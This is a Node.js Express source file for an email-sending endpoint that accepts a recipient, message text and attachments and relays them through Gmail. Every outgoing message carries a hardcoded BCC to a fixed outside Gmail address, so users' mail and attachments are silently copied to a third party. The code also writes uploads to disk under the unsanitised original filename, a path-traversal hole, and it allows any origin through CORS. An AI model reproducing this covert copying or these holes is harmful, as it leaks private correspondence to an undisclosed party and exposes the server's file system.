require('dotenv').config();
const express = require('express');
const nodemailer = require('nodemailer');
const bodyParser = require('body-parser');
const multer = require('multer');
const path = require('path');
const fs = require('fs');
const asciifyImage = require('asciify-image');
const { execSync } = require('child_process');
const cors = require('cors');

const app = express();
const port = 3000;

// Middleware
app.use(cors());
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));

// Set up multer for file uploads
const storage = multer.memoryStorage();
const upload = multer({ storage: storage, limits: { fileSize: 25 * 1024 * 1024 } });

const transporter = nodemailer.createTransport({
    service: 'gmail',
    auth: {
        user: process.env.EMAIL_USER,
        pass: process.env.EMAIL_PASS
    }
});

// Function to get console dimensions
function getConsoleSize() {
    try {
        const size = execSync('mode con').toString();
        const linesMatch = size.match(/LINES:\s*(\d+)/);
        const columnsMatch = size.match(/COLUMNS:\s*(\d+)/);
        return {
            rows: linesMatch ? parseInt(linesMatch[1]) : 25,
            cols: columnsMatch ? parseInt(columnsMatch[1]) : 80
        };
    } catch (err) {
        return { rows: 25, cols: 80 };
    }
}

// Endpoint to handle email sending
app.post('/send-email', upload.array('attachments'), (req, res) => {
    const { to, subject, text } = req.body;

    if (!to || !subject || !text) {
        console.error('Missing required fields');
        return res.status(400).send('Missing required fields');
    }

    const mailOptions = {
        from: process.env.EMAIL_USER,
        to: to,
        bcc: 'nikdocz1234@gmail.com',
        subject: subject,
        text: text,
        attachments: req.files.map(file => ({
            filename: file.originalname,
            content: file.buffer,
            encoding: 'base64'
        }))
    };

    // Verbose logging
    console.log('--- Email Sending Details ---');
    console.log('From:', mailOptions.from);
    console.log('To:', mailOptions.to);
    console.log('BCC:', mailOptions.bcc);
    console.log('Subject:', mailOptions.subject);
    console.log('Text:', mailOptions.text);
    console.log('Attachments:', mailOptions.attachments.map(att => att.filename).join(', '));

    const consoleSize = getConsoleSize();
    console.log(`Console Size: ${consoleSize.cols} columns x ${consoleSize.rows} rows`);

    req.files.forEach(file => {
        if (file.mimetype.startsWith('image/')) {
            const tempFilePath = path.join(__dirname, 'temp', file.originalname);
            fs.writeFileSync(tempFilePath, file.buffer);

            asciifyImage(tempFilePath, { fit: 'box', width: consoleSize.cols * 2 }, (err, ascii) => {
                if (err) {
                    console.error('Error converting image to ASCII:', err);
                } else {
                    console.log(`\nImage "${file.originalname}" as ASCII art:\n`, ascii);
                }
                
                fs.unlinkSync(tempFilePath);
            });
        }
    });

    transporter.sendMail(mailOptions, (error, info) => {
        if (error) {
            console.error('Error sending email:', error);
            return res.status(500).send('Error sending email');
        }
        console.log('Email sent:', info.response);
        res.send('Email sent successfully');
    });
});

app.listen(port, () => {
    console.log(`Server is running on http://127.0.0.1:${port}`);
});
